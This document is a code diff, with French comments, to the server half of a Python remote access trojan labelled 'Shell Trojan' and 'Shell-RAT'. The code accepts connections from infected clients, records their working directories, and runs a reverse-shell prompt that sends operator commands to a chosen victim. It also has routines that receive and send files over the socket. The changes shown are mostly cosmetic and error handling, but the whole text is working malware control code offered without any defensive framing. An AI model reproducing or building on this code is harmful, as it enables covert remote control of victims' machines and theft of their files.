@@ -33,12 +33,12 @@ class Server:
         self.verbose = True
         
     def print_baniere(self):
-        print("\n"+"="*100+"\n"+"+"*100)
+        print("\n"+"="*80+"\n"+"+"*80)
         tprint(
             text=" Shell Trojan",
             font='rnd-small',
         )
-        print("\n"+"#"*100+"\n"+"-"*100)
+        print("\n"+"#"*80+"\n"+"-"*80)
 
     def get_server_socket(self, custom_port=None):
         """
@@ -68,31 +68,31 @@ class Server:
             try:
                 client_socket, client_address = self.server_socket.accept()
             except OSError as e:
-                print(" ! Server socket fermer ! ".center())
+                print("\n ! Server socket fermer ! \n".center(80,"="))
                 break
-            else:
-                print(" \n\n ")
-                print(tabulate.tabulate(
-                                    [
-                                        [  
-                                            "Nouveau client connecté !", 
-                                            f" {client_address[0]}:{client_address[1]}", 
-                                            f"{datetime.now().time()}"
-                                        ]
-                                    ],
 
-                                    headers = [
-                                                "Notification", 
-                                                "Détails",
-                                                "Time"
+            print(" \n\n ")
+            print(tabulate.tabulate(
+                                [
+                                    [  
+                                        "Nouveau client connecté !", 
+                                        f" {client_address[0]}:{client_address[1]}", 
+                                        f"{datetime.now().time()}"
                                     ]
-                ))
-                # Reception du repertoire de travail du client 
-                cwd = client_socket.recv(BUFFER_SIZE).decode()
-                print("[+] Working directory en cours : ", cwd)
-                # Ajout du client au dictionnaire 
-                self.clients[client_address] = client_socket
-                self.clients_cwd[client_address] = cwd
+                                ], 
+
+                                headers = [
+                                            "Notification", 
+                                            "Détails",
+                                            "Time"
+                                ]
+            ))
+            # Reception du repertoire de travail du client 
+            cwd = client_socket.recv(BUFFER_SIZE).decode()
+            print("[+] Working directory en cours : ", cwd)
+            # Ajout du client au dictionnaire 
+            self.clients[client_address] = client_socket
+            self.clients_cwd[client_address] = cwd
 
     def accept_connections(self):
         # Accepter les nouveaux clients avec des threads separer (Multithreading)
@@ -114,10 +114,15 @@ class Server:
         """ Interface de communicatiomn avec le client """
         while True:
             try : 
-                command = input("\n\t>> [.-Shell-RAT-.]+++[-_-]  #>> ").strip() # Invite de commande 
+                command = input("\n\t>> [.-Shell-RAT-.]--[-_-]  #>> ").strip() # Invite de commande Serveur 
             except KeyboardInterrupt as e: 
                 print("\n\n")
-                conf = input("\n\t\t Confirmer la fermeture d'urgence ...( Y / N ) > ").lower().lstrip()
+                try : 
+                    conf = input("\n\t\t Confirmer la fermeture d'urgence ...( Y / N ) > ").lower().lstrip()
+                except KeyboardInterrupt as e: 
+                    print("\n\t\t Retour a l'interpreteur ! ")
+                    continue
+
                 if conf in ["yes",'oui','y','o']:
                     break
 
@@ -164,8 +169,8 @@ class Server:
             Accepting client connections and starting the main interpreter
         """
         self.print_baniere()
-        self.start_interpreter()
         self.accept_connections()
+        self.start_interpreter()
         
     
     def start_reverse_shell(self):
@@ -175,9 +180,27 @@ class Server:
         client_socket = self.clients[self.current_client]
 
         # Debut du shell reverse sur le client a partir du repertoire de travail du client 
+        print( "\n" ,
+               "+"*80 , 
+               "\n" , 
+               "-"*80,
+               '\n',
+               f" COMMUNICATION EN COURS AVEC LE CLIENT -->>[- {self.clients[self.current_client].getpeername()} -]<<-- ",
+               '\n',
+               "+"*80 , 
+               "\n" , 
+               "-"*80,
+               "\n"
+               )
         while True:
             # Prompt permettant d'entrer les commandes et de les envoyer aux clients  
-            command = input(f"{cwd} $> ")
+
+            try : 
+                command = input(f"\n\t{cwd} $)> ")
+            except EOFError as e: 
+                print(" \n\t [+][WARNING][+] INTERRUPTION BRUTAL DU SYSTEME NON AUTPRISER ! \n\t\t [+][info] Retourner sur l'interpreteur et taper la commande <exit> ou <quit> !")
+                continue
+
             if not command.strip():
                 # Commande vide 
                 continue
@@ -261,28 +284,25 @@ class Server:
         d'instance (Gain d'effoicacite et de peroformance du code )
     """
     @classmethod
-    def _receive_file(cls, s: socket.socket, buffer_size=4096):
+    def _receive_file(cls, s: socket.socket, buffer_size=4096,verbose=False):
+        # Reception des info du fichier a recevoir via le socket 
         received = s.recv(buffer_size).decode()
         filename, filesize = received.split(SEPARATOR)
-        # recupere juste le nom du fichier si le chemin est forunis 
+        # Effacer le chemin absolue et garder uniquement le filename 
         filename = os.path.basename(filename)
-        # Convertit en entier 
+        # Convertir la taille en entier 
         filesize = int(filesize)
-        # Commence la reception du fichier 
-        # Affiche la barre de progression ! Juste pour le kiff :) !!!!!!!!!!!!
-        progress = tqdm.tqdm(range(filesize), f" [info] : Reception >>[{filename}]<< ", unit="B", unit_scale=True, unit_divisor=1024)
- 
+        # Commencer la reception du fichier 
+        # et ecrire les data dans un fichiers ouvert en stream 
+        progress = tqdm.tqdm(range(filesize), f"\n\t[+] Reception -->>[ {filename} ]<<-- ", unit="B", unit_scale=True, unit_divisor=1024)
         with open(filename, "wb") as f:
             while True:
                 bytes_read = s.recv(buffer_size)
                 if not bytes_read:
-                    # Si aucune data a reçu ! La reception est terminer 
-                    break            
-                # Ecrire en binaire toutes les data recu 
+                    break
                 f.write(bytes_read)
-                # Mettre a jour la barre de progression 
-                progress.update(len(bytes_read))
-        # Une fois l'operation finis fermer le socket ! TOUJOURS FERMER LES SOCKETS OUVERTS !!!!!!!! TOUJOURS 
+                if verbose:
+                    progress.update(len(bytes_read))
         s.close()
 
     @classmethod
@@ -293,7 +313,7 @@ class Server:
         s.send(f"{filename}{SEPARATOR}{filesize}".encode())
         # Commencer l'envoie 
         # Activer la barre de progression! Encore pour le kiFF :) :) :) :) ! AHHHHHHHHHHHHHH 
-        progress = tqdm.tqdm(range(filesize), f" [info] : Reception >>[{filename}]<< ", unit="B", unit_scale=True, unit_divisor=1024)
+        progress = tqdm.tqdm(range(filesize), f"\n\t[+] [info] : Reception >>[{filename}]<< ", unit="B", unit_scale=True, unit_divisor=1024)
         with open(filename, "rb") as f:
             while True:
                 bytes_read = f.read(buffer_size)
